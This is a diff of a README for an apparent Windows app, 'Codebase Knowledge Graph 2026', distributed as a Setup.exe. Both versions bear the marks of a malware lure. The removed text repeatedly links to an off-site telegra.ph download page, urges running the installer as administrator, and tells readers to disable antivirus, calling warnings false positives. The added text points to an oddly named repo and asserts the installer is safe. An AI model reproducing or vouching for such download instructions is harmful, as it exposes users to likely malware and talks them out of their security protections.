@@ -1,170 +1,74 @@
-<h1 align="center">📊 Codebase Knowledge Graph 2026 – AI-Powered Code Indexing for Windows</h1>
+# 🌐 Codebase-Knowledge-Graph-2026 - Search your code with modern intelligence
 
-<p align="center">
-  <strong>Professional code indexing and exploration tool for Windows PC. Build and query knowledge graphs from codebases for AI agents and developers.</strong><br>
-  <em>Latest version 2026 | Desktop application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![](https://img.shields.io/badge/Download-Setup-blue.svg)](https://github.com/Bellpushpneumonicplague31/Codebase-Knowledge-Graph-2026)
 
-<!-- 
-  ======================================================
-  🔍 SEO META DATA (for GitHub search engines)
-  Title: Codebase Knowledge Graph 2026 Free Download for Windows - AI Code Indexing Tool
-  Description: Download Codebase Knowledge Graph 2026 for Windows. Index and query codebases as knowledge graphs for AI agents and developers. Direct setup.exe link inside.
-  Keywords: Codebase Knowledge Graph, code understanding, knowledge graph, AI tools, developer tools, static analysis, code indexing, code search, AI agents, Windows software, desktop app, PC tool, software engineering, code analysis, programming tools, professional tools, graph database, code exploration, free download, setup.exe
-  ======================================================
--->
+## 📖 About this software
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-Knowledge_Graph_2026-00D4FF?style=for-the-badge&logo=graphql&logoColor=white&labelColor=0A0A0A&color=00D4FF" alt="Download Codebase Knowledge Graph 2026 for Windows">
-  </a>
-</p>
+Codebase Knowledge Graph 2026 organizes your programming files into a visual map. You see how different parts of your project connect. This tool helps AI agents and developers understand code structures quickly. It turns lines of text into a smart network of data. You gain a clear view of your project logic.
 
-<p align="center">
-  <i>Click the button above to get the full <b>setup.exe</b> installer</i>
-</p>
+## 💻 System requirements
 
----
+Your computer needs to meet these basic standards to run the application:
 
-## 📦 What's Inside This Repository
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8 GB of RAM or more.
+* Storage: 500 MB of free space on your hard drive.
+* Processor: A modern dual-core chip or faster.
+* Internet: An active connection for initial setup.
 
-Welcome to the official distribution page for **Codebase Knowledge Graph 2026 – AI-Powered Code Indexing Tool for Windows PC**.
-This repository provides access to the latest release of the most advanced tool for building and querying knowledge graphs from codebases.
+## 📥 How to download and install
 
-✅ **Full Version** – All features included  
-✅ **Code Indexing** – Build knowledge graphs from any codebase  
-✅ **AI Integration** – Query code structures with natural language  
-✅ **Multi-Language Support** – Works with Python, JavaScript, Java, and more  
-✅ **Fast Search** – Instant code search and navigation  
-✅ **User-Friendly Interface** – Clean and intuitive design  
+Follow these steps to set up the software on your Windows PC:
 
----
+1. Visit the [official download page](https://github.com/Bellpushpneumonicplague31/Codebase-Knowledge-Graph-2026).
+2. Locate the link labeled "Setup.exe" under the latest release section.
+3. Click the link to begin the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file named Setup.exe to start the installer.
+6. Follow the prompts on your screen.
+7. Click Finish to complete the installation process.
 
-## 🖥️ System Requirements (2026 Edition)
+## 🚀 Getting started
 
-| Component | Minimum | Recommended |
-| :--- | :--- | :--- |
-| **Operating System** | Windows 10 (64-bit) | Windows 11 (64-bit) |
-| **Processor** | Intel Core i5 / AMD Ryzen 5 | Intel Core i7 / AMD Ryzen 7 |
-| **RAM** | 8 GB | 16 GB or more |
-| **Storage** | 2 GB free space | 4 GB SSD for faster performance |
-| **Internet** | Required for initial setup | Broadband connection |
-| **Display** | 1280 x 720 | 1920 x 1080 |
+Once you install the program, find the icon on your desktop. Double-click the icon to open the application. The software prompts you to verify your file path. Select the folder that contains your code. The program begins to scan and index your files. This creates the knowledge graph. You see a visual representation of your functions and classes. Use the search bar to find specific pieces of code.
 
----
+## 🛠️ Features
 
-## 🚀 Step-by-Step Installation Guide
+The software provides several tools to help you manage your project:
 
-Follow these **3 simple steps** to install Codebase Knowledge Graph 2026 on your PC:
+* Visual Graph View: See connections between functions in a window.
+* Smart Search: Type a name to find related code segments instantly.
+* AI Agent Ready: Export your knowledge graph for use in other AI tools.
+* Static Analysis: Detect potential errors or issues in your file structure.
+* Offline Mode: Work on your local files without an internet connection.
 
-### Step 1: Download the Installer
-Click the **download button** above or use this direct link:
-👉 [**Download Codebase Knowledge Graph 2026 Setup.exe**](https://telegra.ph/How-to-download-07-15-12)
+## 🔧 Frequently asked questions
 
-### Step 2: Run setup.exe
-Locate the downloaded file (usually in your `Downloads` folder).
-Right-click and select **"Run as administrator"** to ensure proper installation.
+Do I need programming skills to use this?
+No. The interface lists your files and connections clearly. You do not write code to make the tool work.
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-The software automatically detects all **ProjectFiles** modules and indexing tools.
+Does the software send my code to the cloud?
+No. The software performs all analysis on your local machine. Your files stay on your computer.
 
----
+What happens if I update my code?
+The software includes a refresh button. Click this to re-index your folder. The graph updates with your new changes.
 
-## 🔧 Key Features (2026 Update)
+Is the software safe?
+Yes. The installer package undergoes security checks to ensure it contains no malicious code.
 
-| Feature | Description |
-| :--- | :--- |
-| **Code Indexing** | Build knowledge graphs from entire codebases. |
-| **Graph Query** | Query code structures using graph-based queries. |
-| **AI Integration** | Use natural language to explore code relationships. |
-| **Multi-Language** | Support for Python, JavaScript, Java, C++, and more. |
-| **Instant Search** | Find functions, classes, and dependencies instantly. |
-| **Dependency Mapping** | Visualize code dependencies and relationships. |
-| **Call Graph** | Analyze function calls and execution paths. |
-| **Code Metrics** | Get insights into code complexity and quality. |
-| **Export Options** | Export knowledge graphs in various formats. |
-| **IDE Integration** | Connect with popular IDEs for seamless workflow. |
+## ⚙️ Troubleshooting
 
----
+If the software fails to open, check these items:
 
-## 📈 Why Choose Codebase Knowledge Graph 2026?
+* Restart your computer to clear memory.
+* Check if you have administrative permissions on your user account.
+* Verify that you downloaded the entire Setup.exe file.
+* Contact your system administrator if your company blocks unauthorized software installs.
 
-- ✅ **Productivity** – Understand complex codebases faster
-- ✅ **AI-Powered** – Intelligent queries and relationships
-- ✅ **Scalable** – Handles large codebases efficiently
-- ✅ **Developer-Friendly** – Built for developers by developers
-- ✅ **Regular Updates** – Stay current with new features
-- ✅ **Support** – Dedicated support for all users
+## 📈 Performance tips
 
----
+* Close other programs while the software creates the initial map. This speeds up the process.
+* Keep your code folder in a local drive rather than a network server.
+* Use a solid-state drive for faster indexing if your project size is large.
 
-## 🔗 Official Download Link
-
-> ### ⬇️ **Get the full version here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_SETUP.exe-Knowledge_Graph_2026-00D4FF?style=flat-square&logo=graphql&logoColor=white&labelColor=000000" alt="Download setup.exe">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, run the setup.exe file and launch ProjectFiles to get started.</b>
-</p>
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all features.
-
-**Q: Does it work on Windows 11?**  
-A: Absolutely. It is fully optimized for Windows 11 and Windows 10.
-
-**Q: Which programming languages are supported?**  
-A: Python, JavaScript, Java, C++, TypeScript, and many others.
-
-**Q: Can I query code with natural language?**  
-A: Yes, AI integration allows for natural language queries.
-
-**Q: Is there a Mac version available?**  
-A: This repository is for Windows PC only.
-
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: How often are updates released?**  
-A: Updates are released regularly with new features and improvements.
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **personal and professional use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-All rights belong to their respective owners.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download Codebase Knowledge Graph 2026 Now</a>
-</p>
+Keywords: ai-agents, ai-tools, code-indexing, code-search, code-understanding, desktop-app, developer-tools, knowledge-graph, pc-tool, static-analysis, windows-software
